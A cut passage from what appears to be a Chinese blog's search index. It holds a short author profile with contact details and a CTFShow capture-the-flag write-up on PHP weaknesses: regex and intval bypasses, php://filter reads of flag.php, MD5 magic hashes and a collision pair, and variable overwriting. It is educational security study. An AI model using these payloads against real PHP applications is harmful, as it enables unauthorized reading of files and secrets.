4.15</li> <li>\u7cfb\u5185\u6392\u540d \u2026\u2026/1640 (\u2026\u2026%)</li> </ul> </li> </ul> </li> </ul>"},{"location":"ME/experience/#_3","title":"\u672c\u79d1\u8bfe\u7a0b \uff08\u5f85\u5b8c\u5584\uff09","text":"<ul> <li>\u6570\u7406\u57fa\u7840<ul> <li>\u6570\u5b66\uff08\u9ad8\u7b49\u6570\u5b66  \u7ebf\u6027\u4ee3\u6570  \u79bb\u6563\u6570\u5b66\uff09</li> <li>\u7269\u7406\uff08\u5927\u5b66\u7269\u7406\uff09</li> </ul> </li> <li>\u8f6f\u4ef6\u5de5\u7a0b<ul> <li>\u57fa\u7840\uff08\u7a0b\u5e8f\u8bbe\u8ba1\u57fa\u7840  \u6570\u636e\u6570\u636e\u4e0e\u7b97\u6cd5  \u8ba1\u7b97\u673a\u7ec4\u6210\u539f\u7406  \u6570\u636e\u5e93  \u9762\u5411\u5bf9\u8c61\u7a0b\u5e8f\u8bbe\u8ba1\uff09</li> </ul> </li> <li>\u601d\u60f3\u653f\u6cbb\uff08\u601d\u60f3\u9053\u5fb7\u4e0e\u6cd5\u6cbb  \u4e2d\u56fd\u8fd1\u73b0\u4ee3\u53f2\u7eb2\u8981  \u5f62\u52bf\u4e0e\u653f\u7b56  \u519b\u4e8b\u7406\u8bba  \u519b\u4e8b\u6280\u80fd\uff09</li> <li>\u8bed\u8a00\uff08\u5927\u5b66\u82f1\u8bed  \u82f1\u8bed\u542c\u8bf4\u4ea4\u6d41  \u82f1\u8bed\u9605\u8bfb\u5199\u4f5c\uff09</li> <li>\u5176\u4ed6\uff08\u5927\u5b66\u751f\u5b9e\u7528\u5fc3\u7406\u5b66  \u5927\u5b66\u751f\u5b89\u5168\u6559\u80b2  \u5927\u5b66\u751f\u804c\u4e1a\u751f\u6daf\u89c4\u5212\uff09</li> </ul>"},{"location":"ME/introduction/","title":"\u4e2a\u4eba\u4ecb\u7ecd","text":"<p>\u66f4\u65b0\u4e8e 2024-2-9</p>"},{"location":"ME/introduction/#_2","title":"\u4fe1\u606f","text":"<ul> <li>\u59d3\u540d\uff1a\u4faf\u9716\u94b0</li> <li>\u6027\u522b\uff1a\u7537</li> </ul>"},{"location":"ME/introduction/#_3","title":"\u8054\u7cfb\u65b9\u5f0f","text":"<ul> <li>\u90ae\u7bb1\uff1ahou.ly@qq.com</li> <li>QQ\uff1a3412506141</li> </ul>"},{"location":"ME/introduction/#_4","title":"\u516c\u4f17\u8d26\u53f7","text":"<ul> <li>GitHub<ul> <li>\u5f00\u6e90\u4ee3\u7801\u4ed3\u5e93\uff08\u73b0\u5728\u8fd8\u4ec0\u4e48\u90fd\u6ca1\u6709\uff09</li> </ul> </li> <li>\u4e2a\u4eba\u7f51\u7ad9<ul> <li>\u535a\u5ba2\u3001\u6587\u7ae0</li> </ul> </li> </ul> <p>\u66f4\u591a\u70b9\u51fb\u67e5\u770b</p>"},{"location":"ME/profile/","title":"\u4e2a\u4eba\u4fe1\u606f","text":"<ul> <li>\u59d3\u540d\uff1a\u4faf\u9716\u94b0</li> <li>\u6027\u522b\uff1a\u7537</li> </ul> <p>\u5f85\u8865\u5145\u2026\u2026\u2026\u2026</p>"},{"location":"ME/support/","title":"\u6253\u8d4f\u652f\u6301","text":"<p>\u53ef\u4ee5\u7684\u8bdd\uff0c\u8bf7\u6211\u559d\u4e00\u676f\u5496\u5561\u5427\uff01</p> <p></p> <p></p>"},{"location":"TimeLine/","title":"\u65f6\u95f4\u7ebf","text":"<p>\u70b9\u51fb\u5de6\u4fa7\u76ee\u5f55\u6253\u5f00\u6587\u7ae0</p>"},{"location":"TimeLine/Line/DEC/","title":"\u5f00\u53d1 \u65f6\u95f4\u7ebf","text":"<p>\u4ec5\u8bb0\u5f55\u90e8\u5206\u6587\u7ae0</p>"},{"location":"TimeLine/Line/DEC/#_2","title":"\u5f85\u5b8c\u5584\u2026\u2026","text":""},{"location":"TimeLine/Line/WebSec/","title":"\u7f51\u7edc\u5b89\u5168 \u65f6\u95f4\u7ebf","text":"<p>\u4ec5\u8bb0\u5f55\u90e8\u5206\u6587\u7ae0</p>"},{"location":"TimeLine/Line/WebSec/#_2","title":"\u5f85\u5b8c\u5584\u2026\u2026","text":""},{"location":"WEB/","title":"\u7f51\u7edc\u5b89\u5168","text":"<p>\u70b9\u51fb\u5de6\u4fa7\u76ee\u5f55\u6253\u5f00\u6587\u7ae0</p>"},{"location":"WEB/CTFShow/CTFShow-PHP%E7%89%B9%E6%80%A7/","title":"CTFShow PHP\u7279\u6027","text":"<p>\u9898\u76ee\u8303\u56f4\uff1aWeb89 - Web115 | Web123 - Web150</p>"},{"location":"WEB/CTFShow/CTFShow-PHP%E7%89%B9%E6%80%A7/#1","title":"1\u3001\u6570\u7ec4\u7ed5\u8fc7\u6b63\u5219\u8868\u8fbe\u5f0f","text":"<p>\uff08Web 89\uff09</p> <p>preg_match()</p> <p>\u6b64\u51fd\u6570\u7528\u4e8e\u6267\u884c\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d</p> <p>\u8bed\u6cd5:</p> Text Only<pre><code>int preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags = 0 [, int $offset = 0 ]]] )\n</code></pre> <p>\u53c2\u6570\u8bf4\u660e\uff1a</p> <p><code>$pattern</code>: \u8981\u641c\u7d22\u7684\u6a21\u5f0f\uff0c\u5b57\u7b26\u4e32\u5f62\u5f0f\u3002</p> <p><code>$subject</code>: \u8f93\u5165\u5b57\u7b26\u4e32\u3002</p> <p><code>$matches</code>: \u5982\u679c\u63d0\u4f9b\u4e86\u53c2\u6570matches\uff0c\u5b83\u5c06\u88ab\u586b\u5145\u4e3a\u641c\u7d22\u7ed3\u679c\u3002<code>$matches[0]</code>\u5c06\u5305\u542b\u5b8c\u6574\u6a21\u5f0f\u5339\u914d\u5230\u7684\u6587\u672c\uff0c <code>$matches[1]</code>\u5c06\u5305\u542b\u7b2c\u4e00\u4e2a\u6355\u83b7\u5b50\u7ec4\u5339\u914d\u5230\u7684\u6587\u672c\uff0c\u4ee5\u6b64\u7c7b\u63a8\u3002</p> <p><code>$flags</code>\uff1aflags \u53ef\u4ee5\u88ab\u8bbe\u7f6e\u4e3a\u4ee5\u4e0b\u6807\u8bb0\u503c\uff1aPREG_OFFSET_CAPTURE: \u5982\u679c\u4f20\u9012\u4e86\u8fd9\u4e2a\u6807\u8bb0\uff0c\u5bf9\u4e8e\u6bcf\u4e00\u4e2a\u51fa\u73b0\u7684\u5339\u914d\u8fd4\u56de\u65f6\u4f1a\u9644\u52a0\u5b57\u7b26\u4e32\u504f\u79fb\u91cf(\u76f8\u5bf9\u4e8e\u76ee\u6807\u5b57\u7b26\u4e32\u7684)\u3002 \u6ce8\u610f\uff1a\u8fd9\u4f1a\u6539\u53d8\u586b\u5145\u5230matches\u53c2\u6570\u7684\u6570\u7ec4\uff0c\u4f7f\u5176\u6bcf\u4e2a\u5143\u7d20\u6210\u4e3a\u4e00\u4e2a\u7531 \u7b2c0\u4e2a\u5143\u7d20\u662f\u5339\u914d\u5230\u7684\u5b57\u7b26\u4e32\uff0c\u7b2c1\u4e2a\u5143\u7d20\u662f\u8be5\u5339\u914d\u5b57\u7b26\u4e32 \u5728\u76ee\u6807\u5b57\u7b26\u4e32subject\u4e2d\u7684\u504f\u79fb\u91cf\u3002</p> <p><code>offset</code>: \u901a\u5e38\uff0c\u641c\u7d22\u4ece\u76ee\u6807\u5b57\u7b26\u4e32\u7684\u5f00\u59cb\u4f4d\u7f6e\u5f00\u59cb\u3002\u53ef\u9009\u53c2\u6570 offset \u7528\u4e8e \u6307\u5b9a\u4ece\u76ee\u6807\u5b57\u7b26\u4e32\u7684\u67d0\u4e2a\u672a\u77e5\u5f00\u59cb\u641c\u7d22(\u5355\u4f4d\u662f\u5b57\u8282)\u3002</p> <p>\u8fd4\u56de\u503c(\u91cd\u70b9)\uff1a</p> <p>\u8fd4\u56de pattern \u7684\u5339\u914d\u6b21\u6570\u3002 \u5b83\u7684\u503c\u5c06\u662f 0 \u6b21\uff08\u4e0d\u5339\u914d\uff09\u6216 1 \u6b21\uff0c\u56e0\u4e3a preg_match() \u5728\u7b2c\u4e00\u6b21\u5339\u914d\u540e \u5c06\u4f1a\u505c\u6b62\u641c\u7d22\u3002preg_match_all() \u4e0d\u540c\u4e8e\u6b64\uff0c\u5b83\u4f1a\u4e00\u76f4\u641c\u7d22subject \u76f4\u5230\u5230\u8fbe\u7ed3\u5c3e\u3002 \u5982\u679c\u53d1\u751f\u9519\u8befpreg_match()\u8fd4\u56de FALSE\u3002</p> <p>\u7ed5\u8fc7\u59ff\u52bf:</p> <p>\u5982\u679c\u4e0d\u6309\u89c4\u5b9a\u4f20\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u901a\u5e38\u662f\u4f20\u4e00\u4e2a\u6570\u7ec4\u8fdb\u53bb\uff0c\u8fd9\u6837\u5c31\u4f1a\u62a5\u9519\uff0c\u4ece\u800c\u8fd4\u56defalse\uff0c\u8fbe\u5230\u6211\u4eec\u7684\u76ee\u7684\u3002</p> PHP<pre><code>&lt;?php\nif (isset($_GET['num'])) {\n    $num = $_GET['num'];\n    if (preg_match(\"/[0-9]/\", $num)) {\n        die(\"no no no!\");\n    }\n    if (intval($num)) {\n        echo $flag;\n    }\n}\n?&gt;\n</code></pre> <p>\u91cd\u70b9\uff1apreg_match\u5f53\u68c0\u6d4b\u7684\u53d8\u91cf\u662f\u6570\u7ec4\u7684\u65f6\u5019\u4f1a\u62a5\u9519\u5e76\u8fd4\u56de0\u3002\u800cintval\u51fd\u6570\u5f53\u4f20\u5165\u7684\u53d8\u91cf\u4e5f\u662f\u6570\u7ec4\u7684\u65f6\u5019\uff0c\u4f1a\u8fd4\u56de1 !!!</p> <p>preg_match \u7b2c\u4e8c\u4e2a\u53c2\u6570\u8981\u6c42\u662f\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u4f20\u5165\u6570\u7ec4\u5219\u4e0d\u4f1a\u8fdb\u5165 if \u8bed\u53e5</p> <p>payload:<code>num[]=1</code></p>"},{"location":"WEB/CTFShow/CTFShow-PHP%E7%89%B9%E6%80%A7/#2intval","title":"2\u3001intval \u51fd\u6570\u7684\u4f7f\u7528","text":"<p>\uff08Web 90\uff09</p> <p>intval() \u51fd\u6570\u7528\u4e8e\u83b7\u53d6\u53d8\u91cf\u7684\u6574\u6570\u503c\u3002\u5b83\u901a\u8fc7\u4f7f\u7528\u6307\u5b9a\u7684\u8fdb\u5236 base \u8f6c\u6362\uff08\u9ed8\u8ba4\u662f\u5341\u8fdb\u5236\uff09\uff0c\u8fd4\u56de\u53d8\u91cf var \u7684 integer \u6570\u503c\u3002</p> <p>\u5982\u679c\u4ed6\u7684\u503c\u4e3a\u4e00\u4e2a\u6570\u7ec4\uff0c\u53ea\u8981\u6570\u7ec4\u91cc\u9762\u6709\u503c(\u4ea7\u751f E_NOTICE \u9519\u8bef)\uff0c\u90a3\u4e48\u4e0d\u8bba\u503c\u7684\u6570\u91cf\uff0c\u8fd4\u56de\u503c\u90fd\u4e3a1\uff0c\u7a7a\u6570\u7ec4\u5219\u8fd4\u56de0</p> PHP<pre><code>intval( mixed $value, int $base = 10) : int\n</code></pre> <p>\u53c2\u6570\u8bf4\u660e\uff1a</p> <ul> <li>$var\uff1a\u8981\u8f6c\u6362\u6210 integer \u7684\u6570\u91cf\u503c\u3002</li> <li>$base\uff1a\u8f6c\u5316\u6240\u4f7f\u7528\u7684\u8fdb\u5236\u3002</li> </ul> <p>\u5982\u679c base \u662f 0\uff0c\u901a\u8fc7\u68c0\u6d4b value \u7684\u683c\u5f0f\u6765\u51b3\u5b9a\u4f7f\u7528\u7684\u8fdb\u5236\uff1a</p> <ul> <li>\u5982\u679c\u5b57\u7b26\u4e32\u5305\u62ec\u4e86 \"0x\" (\u6216 \"0X\") \u7684\u524d\u7f00\uff0c\u4f7f\u7528 16 \u8fdb\u5236 (hex)\uff1b\u5426\u5219\uff0c</li> <li>\u5982\u679c\u5b57\u7b26\u4e32\u4ee5 \"0\" \u5f00\u59cb\uff0c\u4f7f\u7528 8 \u8fdb\u5236(octal)\uff1b\u5426\u5219\uff0c</li> <li>\u5c06\u4f7f\u7528 10 \u8fdb\u5236 (decimal)\u3002</li> <li>\u5982\u679cbase\u4e3a0\uff0c\u5219$var\u4e2d\u5b58\u5728\u5b57\u6bcd\u7684\u8bdd\u9047\u5230\u5b57\u6bcd\u5c31\u505c\u6b62\u8bfb\u53d6\uff0c\u4f20\u51654476a\u4f1a\u5c06\u540e\u9762\u7684a\u4e22\u5f03\uff0c\u6bd4\u8f83\u524d\u9762\u7684</li> </ul> <p>\u6210\u529f\u65f6\u8fd4\u56de var \u7684 integer \u503c\uff0c\u5931\u8d25\u65f6\u8fd4\u56de 0\u3002 \u7a7a\u7684 array \u8fd4\u56de 0\uff0c\u975e\u7a7a\u7684 array \u8fd4\u56de 1\u3002</p> <p>\u5b57\u7b26\u4e32\u6709\u53ef\u80fd\u8fd4\u56de 0\uff0c\u867d\u7136\u53d6\u51b3\u4e8e\u5b57\u7b26\u4e32\u6700\u5de6\u4fa7\u7684\u5b57\u7b26\u3002</p> <p>Web 92\uff1aintval()\u51fd\u6570\u5982\u679c\\(base\u4e3a0\uff0c\u5219\\)var\u4e2d\u5b58\u5728\u5b57\u6bcd\u7684\u8bdd\u9047\u5230\u5b57\u6bcd\u5c31\u505c\u6b62\u8bfb\u53d6\uff0c\u4f46\u662fe\u8fd9\u4e2a\u5b57\u6bcd\u6bd4\u8f83\u7279\u6b8a\uff0c\u53ef\u4ee5\u5728PHP\u4e2d\u4e0d\u662f\u79d1\u5b66\u8ba1\u6570\u6cd5\u3002\u6240\u4ee5\u4e3a\u4e86\u7ed5\u8fc7\u524d\u9762\u7684==4476\u6211\u4eec\u5c31\u53ef\u4ee5\u6784\u9020 4476e123 \u5176\u5b9e\u4e0d\u9700\u8981\u662fe\u5176\u4ed6\u7684\u5b57\u6bcd\u4e5f\u53ef\u4ee5</p> PHP<pre><code>&lt;?php\nif (isset($_GET['num'])) {\n    $num = $_GET['num'];\n    if ($num === \"4476\") {\n        die(\"no no no!\");\n    }\n    if (intval($num, 0) === 4476) {\n        echo $flag;\n    } else {\n        echo intval($num, 0);\n    }\n}\n?&gt;\n</code></pre> <p>\u79d1\u5b66\u8ba1\u6570\u6cd5\u4e5f\u53ef\u4ee5\u7ed5\u8fc7</p> PHP<pre><code>intval('4476.0')===4476    \u5c0f\u6570\u70b9 #intval\u53ea\u8bc6\u522b\u6574\u6570\u90e8\u5206\nintval('+4476.0')===4476   \u6b63\u8d1f\u53f7\nintval('4476e0')===4476    \u79d1\u5b66\u8ba1\u6570\u6cd5\nintval('0x117c')===4476    16\u8fdb\u5236\nintval('010574')===4476    8\u8fdb\u5236 #\u5f53\u9898\u76ee\u8fc7\u6ee4\u5b57\u6bcd\u65f6\uff0c2\u548c16\u8fdb\u5236\u90fd\u4e0d\u597d\u7528\nintval(' 010574')===4476   8\u8fdb\u5236+\u7a7a\u683c #\u5f53\u8981\u6c42\u5b58\u57280\u4e140\u4e0d\u662f\u9996\u4f4d\u65f6\nintval('+010574')===4476   8\u8fdb\u5236+\u52a0\u53f7\nintval('%2b010574')===4476\nintval('0b1000101111100')===4476  2\u8fdb\u5236\n</code></pre> <p>payload:<code>num=4476.0</code></p>"},{"location":"WEB/CTFShow/CTFShow-PHP%E7%89%B9%E6%80%A7/#3","title":"3\u3001\u6b63\u5219\u8868\u8fbe\u5f0f\u4fee\u9970\u7b26","text":"<p>\uff08Web 91\uff09</p> PHP<pre><code>&lt;?php\nif (preg_match('/^php$/im', $a)) {\n    if (preg_match('/^php$/i', $a)) {\n        echo 'hacker';\n    } else {\n        echo $flag;\n    }\n} else {\n    echo 'nonononono';\n}\n?&gt;\n</code></pre> <p>i \u4e0d\u533a\u5206 (ignore) \u5927\u5c0f\u5199\uff1bm \u591a (more) \u884c\u5339\u914d\uff0c\u82e5\u6709\u6362\u884c\u7b26\u5219\u4ee5\u6362\u884c\u7b26\u5206\u5272\uff0c\u6309\u884c\u5339\u914d</p> <p>payload:<code>abc%0aphp</code>\uff0c\u7b2c\u4e00\u884c\u5339\u914d\u6362\u884c\u540e\u6709 php \u6545\u901a\u8fc7\uff0c\u7b2c\u4e8c\u4e2a\u4e0d\u7b26\u5408 php \u5f00\u5934 php \u7ed3\u5c3e\u6545\u4e0d\u901a\u8fc7\uff08\u8fd9\u91cc\u7684'%0a'\u662furl\u7f16\u7801\u7684\u6362\u884c\u7b26\u3002\uff09</p> <p>\u5b98\u65b9\u7ed9\u7684\u94fe\u63a5\uff1a\uff08Apache HTTPD \u6362\u884c\u89e3\u6790\u6f0f\u6d1e(CVE-2017-15715)\u4e0e\u62d3\u5c55\uff09</p> <p>https://blog.csdn.net/qq_46091464/article/details/108278486</p> <p>\u6b63\u5219\u8868\u8fbe\u5f0f\u6269\u5c55</p> Text Only<pre><code>i \n\u4e0d\u533a\u5206(ignore)\u5927\u5c0f\u5199\n\nm\n\u591a(more)\u884c\u5339\u914d\n\u82e5\u5b58\u5728\u6362\u884c\\n\u5e76\u4e14\u6709\u5f00\u59cb^\u6216\u7ed3\u675f$\u7b26\u7684\u60c5\u51b5\u4e0b\uff0c\n\u5c06\u4ee5\u6362\u884c\u4e3a\u5206\u9694\u7b26\uff0c\u9010\u884c\u8fdb\u884c\u5339\u914d\n$str = \"abc\\nabc\";\n$preg = \"/^abc$/m\";\npreg_match($preg, $str,$matchs);\n\u8fd9\u6837\u5176\u5b9e\u662f\u7b26\u5408\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\uff0c\u56e0\u4e3a\u5339\u914d\u7684\u65f6\u5019 \u5148\u662f\u5339\u914d\u6362\u884c\u7b26\u524d\u9762\u7684\uff0c\u63a5\u7740\u5339\u914d\u6362\u884c\u7b26\u540e\u9762\u7684\uff0c\u4e24\u4e2a\u90fd\u662fabc\u6240\u4ee5\u53ef\u4ee5\u901a\u8fc7\u6b63\u5219\u8868\u8fbe\u5f0f\u3002\n\ns\n\u7279\u6b8a\u5b57\u7b26\u5706\u70b9 . \u4e2d\u5305\u542b\u6362\u884c\u7b26\n\u9ed8\u8ba4\u7684\u5706\u70b9 . \u662f\u5339\u914d\u9664\u6362\u884c\u7b26 \\n \u4e4b\u5916\u7684\u4efb\u4f55\u5355\u5b57\u7b26\uff0c\u52a0\u4e0as\u4e4b\u540e, .\u5305\u542b\u6362\u884c\u7b26\n$str = \"abggab\\nacbs\";\n$preg = \"/b./s\";\npreg_match_all($preg, $str,$matchs);\n\u8fd9\u6837\u5339\u914d\u5230\u7684\u6709\u4e09\u4e2a bg b\\n bs\n\nA\n\u5f3a\u5236\u4ece\u76ee\u6807\u5b57\u7b26\u4e32\u5f00\u5934\u5339\u914d;\n\nD\n\u5982\u679c\u4f7f\u7528$\u9650\u5236\u7ed3\u5c3e\u5b57\u7b26,\u5219\u4e0d\u5141\u8bb8\u7ed3\u5c3e\u6709\u6362\u884c; \n\ne\n\u914d\u5408\u51fd\u6570preg_replace()\u4f7f\u7528, \u53ef\u4ee5\u628a\u5339\u914d\u6765\u7684\u5b57\u7b26\u4e32\u5f53\u4f5c\u6b63\u5219\u8868\u8fbe\u5f0f\u6267\u884c; \n</code></pre>"},{"location":"WEB/CTFShow/CTFShow-PHP%E7%89%B9%E6%80%A7/#4highlight_file","title":"4\u3001highlight_file \u8def\u5f84","text":"<p>\uff08Web 96\uff09</p> <p>highlight_file \u7684\u53c2\u6570\u53ef\u4ee5\u662f\u8def\u5f84\u7684</p> PHP<pre><code>&lt;?php\nhighlight_file(__FILE__);\n\nif (isset($_GET['u'])) {\n    if ($_GET['u'] == 'flag.php') {\n        die(\"no no no\");\n    } else {\n        highlight_file($_GET['u']);\n    }\n}\n?&gt;\n</code></pre> <p>if \u8bed\u53e5\u53ea\u6bd4\u5bf9\u5b57\u7b26\u4e32\uff0chighlight_file \u53ef\u4ee5\u5199\u8def\u5f84\uff0c\u6545 payload \u6709\u591a\u79cd\u89e3\u6cd5\uff1a</p> PHP<pre><code>/var/www/html/flag.php              \u7edd\u5bf9\u8def\u5f84\n./flag.php                          \u76f8\u5bf9\u8def\u5f84\nphp://filter/resource=flag.php      php\u4f2a\u534f\u8bae\nphp://filter/read=convert.base64-encode/resource=flag.php\n</code></pre> Text Only<pre><code>payload\uff1a\n1. ?u=php://filter/read=convert.base64-encode/resource=flag.php\n2. ?u=php://filter/resource=flag.php\n3. ?u=./flag.php \n4. ?u=/var/www/html/flag.php\n</code></pre>"},{"location":"WEB/CTFShow/CTFShow-PHP%E7%89%B9%E6%80%A7/#5md5","title":"5\u3001md5 \u6bd4\u8f83\u7f3a\u9677","text":""},{"location":"WEB/CTFShow/CTFShow-PHP%E7%89%B9%E6%80%A7/#_1","title":"\u7b2c\u4e00\u79cd","text":"<p>\uff08Web 97\uff09</p> <p>PHP \u4e2d hash \u6bd4\u8f83\u662f\u5b58\u5728\u7f3a\u9677\u7684\uff0cMD5 \u65e0\u6cd5\u5904\u7406\u6570\u7ec4\uff0c\u5982\u679c\u4f20\u5165\u6570\u7ec4\u5219\u8fd4\u56de NULL\uff0c\u4e24\u4e2a NULL \u662f\u5f3a\u76f8\u7b49\u7684</p> PHP<pre><code>&lt;?php\n    if ($_POST['a'] != $_POST['b']) {\n    if (md5($_POST['a']) === md5($_POST['b'])) {\n        echo $flag;\n    } else {\n        print 'Wrong.';\n    }\n}\n?&gt;\n</code></pre> <p>payload:<code>a[]=1&amp;b[]=2</code></p>"},{"location":"WEB/CTFShow/CTFShow-PHP%E7%89%B9%E6%80%A7/#_2","title":"\u7b2c\u4e8c\u79cd","text":"<p>\u5982\u679c\u8fdb\u884c\u4e86string\u5f3a\u5236\u8f6c\u7c7b\u578b\u540e\uff0c\u5219\u4e0d\u518d\u63a5\u53d7\u6570\u7ec4</p> <p>md5 \u5f31\u6bd4\u8f83\uff0c\u4f7f\u7528\u4e86\u5f3a\u5236\u7c7b\u578b\u8f6c\u6362\u540e\u4e0d\u518d\u63a5\u6536\u6570\u7ec4</p> PHP<pre><code>&lt;?php\n$a = (string)$a;\n$b = (string)$b;\nif (($a !== $b) &amp;&amp; (md5($a) == md5($b))) {\n    echo $flag;\n}\n?&gt;\n</code></pre> <p>md5 \u5f31\u6bd4\u8f83\uff0c\u4e3a 0e \u5f00\u5934\u7684\u4f1a\u88ab\u8bc6\u522b\u4e3a\u79d1\u5b66\u8bb0\u6570\u6cd5\uff0c\u7ed3\u679c\u5747\u4e3a 0\uff0c\u6240\u4ee5\u53ea\u9700\u627e\u4e24\u4e2a md5 \u540e\u90fd\u4e3a 0e \u5f00\u5934\u4e14 0e \u540e\u9762\u5747\u4e3a\u6570\u5b57\u7684\u503c\u5373\u53ef\u3002</p> <p>\u8fd9\u91cc\u9644\u4e0a\u5e38\u89c1\u7684 0E \u5f00\u5934\u7684 MD5</p> Text Only<pre><code>\u539f\u503c\uff1a             MD5\u503c\uff1a\nQNKCDZO           0e830400451993494058024219903391\n240610708         0e462097431906509019562988736854\ns878926199a       0e545993274517709034328855841020\ns155964671a       0e342768416822451524974117254469\ns214587387a       0e848240448830537924465865611904\ns214587387a       0e848240448830537924465865611904\ns878926199a       0e545993274517709034328855841020\ns1091221200a      0e940624217856561557816327384675\ns1885207154a      0e509367213418206700842008763514\ns1502113478a      0e861580163291561247404381396064\ns1885207154a      0e509367213418206700842008763514\ns1836677006a      0e481036490867661113260034900752\ns155964671a       0e342768416822451524974117254469\ns1184209335a      0e072485820392773389523109082030\ns1665632922a      0e731198061491163073197128363787\ns1502113478a      0e861580163291561247404381396064\ns1836677006a      0e481036490867661113260034900752\ns1091221200a      0e940624217856561557816327384675\ns155964671a       0e342768416822451524974117254469\ns1502113478a      0e861580163291561247404381396064\ns155964671a       0e342768416822451524974117254469\ns1665632922a      0e731198061491163073197128363787\ns155964671a       0e342768416822451524974117254469\ns1091221200a      0e940624217856561557816327384675\ns1836677006a      0e481036490867661113260034900752\ns1885207154a      0e509367213418206700842008763514\ns532378020a       0e220463095855511507588041205815\ns878926199a       0e545993274517709034328855841020\ns1091221200a      0e940624217856561557816327384675\ns214587387a       0e848240448830537924465865611904\ns1502113478a      0e861580163291561247404381396064\ns1091221200a      0e940624217856561557816327384675\ns1665632922a      0e731198061491163073197128363787\ns1885207154a      0e509367213418206700842008763514\ns1836677006a      0e481036490867661113260034900752\ns1665632922a      0e731198061491163073197128363787\ns878926199a       0e545993274517709034328855841020\n</code></pre> <p>payload: <code>a=QNKCDZO&amp;b=240610708</code></p> <p>MD5 \u7b49\u4e8e\u81ea\u8eab\uff0c\u5982<code>md5($a)==$a</code>\uff0cphp \u5f31\u6bd4\u8f83\u4f1a\u628a 0e \u5f00\u5934\u8bc6\u522b\u4e3a\u79d1\u5b66\u8ba1\u6570\u6cd5\uff0c\u7ed3\u679c\u5747\u4e3a 0\uff0c\u6240\u4ee5\u6b64\u65f6\u9700\u8981\u627e\u5230\u4e00\u4e2a MD5 \u52a0\u5bc6\u524d\u540e\u90fd\u662f 0e \u5f00\u5934\u7684\uff0c\u5982<code>0e215962017</code></p>"},{"location":"WEB/CTFShow/CTFShow-PHP%E7%89%B9%E6%80%A7/#_3","title":"\u7b2c\u4e09\u79cd","text":"<p>md5 \u5f3a\u78b0\u649e</p> PHP<pre><code>&lt;?php\n$a = (string)$a;\n$b = (string)$b;\nif (($a !== $b) &amp;&amp; (md5($a) === md5($b))) {\n    echo $flag;\n}\n?&gt;\n\n\u8fd9\u65f6\u5019\u9700\u8981\u627e\u5230\u4e24\u4e2a\u771f\u6b63\u7684md5\u503c\u76f8\u540c\u6570\u636e\n\na=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2\n</code></pre>"},{"location":"WEB/CTFShow/CTFShow-PHP%E7%89%B9%E6%80%A7/#6","title":"6\u3001\u4e09\u76ee\u8fd0\u7b97\u7b26\u7684\u7406\u89e3 + \u53d8\u91cf\u8986\u76d6","text":"<p>\uff08Web 98\uff09</p> <p>\u5173\u4e8e\u4e09\u76ee\u8fd0\u7b97\u7b26</p> Text Only<pre><code>$if_summary = $roW['IF_SUMMARY']==2?'\u662f':'\u5426';\n\u7b49\u4ef7\u4e8e\n\nif ($row['IF_SUMMARY'] == 2) {\n    $if_summary = \"\u662f\";\n} else {\n    $if_summary = \"\u5426\";\n}\n</code></pre> PHP<pre><code>&lt;?php\ninclude(\"flag.php\");\n$_GET ? $_GET = &amp;$_POST : 'flag';\n$_GET['flag'] == 'flag' ? $_GET = &amp;$_COOKIE : 'flag';\n$_GET['flag'] == 'flag' ? $_GET = &amp;$_SERVER : 'flag';\nhighlight_file($_GET['HTTP_FLAG'] == 'flag' ? $flag : __FILE__);\n\n\n\n// \u89e3\u6790\n$_GET ? $_GET = &amp;$_POST : 'flag';\n==============&gt;\nif ($_GET) {\n    $_GET = &amp;$_POST; //\u53ea\u8981\u6709\u8f93\u5165\u7684get\u53c2\u6570\u5c31\u5c06get\u65b9\u6cd5\u6539\u53d8\u4e3apost\u65b9\u6cd5(\u4fee\u6539\u4e86get\u65b9\u6cd5\u7684\u5730\u5740)\n} else {\n    \"flag\";\n}\n\n\n// \u89e3\u6790\n$_GET['HTTP_FLAG'] == 'flag' ? $flag : __FILE__;\n==============&gt;\nif ($_GET['HTTP_FLAG'] == 'flag') {\n    $flag;\n} else {\n    __FILE__;\n}\n</code></pre> <p>\u8be5\u51fd\u6570\u9996\u5148\u5305\u542b\u4e86\u4e00\u4e2a\u540d\u4e3a\"flag.php\"\u7684\u6587\u4ef6\u3002\u7136\u540e\uff0c\u6839\u636e<code>$_GET</code>\u662f\u5426\u5b58\u5728\uff0c\u5982\u679c\u5b58\u5728\u5219\u5c06\u5176\u8d4b\u503c\u4e3a<code>$_POST</code>\uff0c\u5426\u5219\u8d4b\u503c\u4e3a'flag'\u3002\u63a5\u4e0b\u6765\uff0c\u5224\u65ad<code>$_GET['flag']</code>\u662f\u5426\u7b49\u4e8e'flag'\uff0c\u5982\u679c\u7b49\u4e8e\u5219\u5c06\u5176\u8d4b\u503c\u4e3a<code>$_COOKIE</code>\uff0c\u5426\u5219\u8d4b\u503c\u4e3a'flag'\u3002\u6700\u540e\uff0c\u5224\u65ad<code>$_GET['flag']</code>\u662f\u5426\u7b49\u4e8e'flag'\uff0c\u5982\u679c\u7b49\u4e8e\u5219\u5c06\u5176\u8d4b\u503c\u4e3a<code>$SERVER</code>\uff0c\u5426\u5219\u8d4b\u503c\u4e3a'flag'\u3002\u6700\u540e\uff0c\u6839\u636e<code>$GET['HTTP_FLAG']</code>\u662f\u5426\u7b49\u4e8e'flag'\uff0c\u5982\u679c\u7b49\u4e8e\u5219\u8f93\u51fa<code>$flag</code>\uff0c\u5426\u5219\u8f93\u51fa<code>__FILE__</code>\u3002(\u7b49\u4e8e flag \u5c31\u8f93\u51fa flag\uff0c\u4e0d\u7b49\u4e8e\u663e\u793a\u6e90\u7801)</p> <p>\u4e2d\u95f4\u7684\u4ee3\u7801\u6ca1\u6709\u4f5c\u7528\uff0c\u56e0\u4e3a\u6211\u4eec\u4e0d\u63d0\u4ea4 flag 